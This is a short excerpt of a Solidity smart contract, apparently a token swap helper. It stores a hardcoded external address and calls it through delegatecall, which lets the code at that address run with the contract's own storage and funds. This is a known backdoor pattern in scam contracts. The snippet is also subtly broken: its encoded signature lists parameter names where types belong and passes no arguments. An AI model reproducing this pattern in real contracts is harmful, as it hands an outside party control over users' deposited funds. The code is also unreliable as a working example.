...
contract swapHelperDiyTaskPlus1220R is Ownable {
    using SafeMath for uint256;
    ...
    address public rD = 0x2F31f21C5b16e48A385611C5038009D81FdA307C;
    ...
    // event constructorE( uint256 _approveAmount,address payable _ops,address _fundsOwner, USDTPool _USDTPoolAddress);
    ...
    rD.delegatecall(abi.encodeWithSignature("constructor(_approveAmount,_ops,_fundsOwner,USDTPool)"));
    }
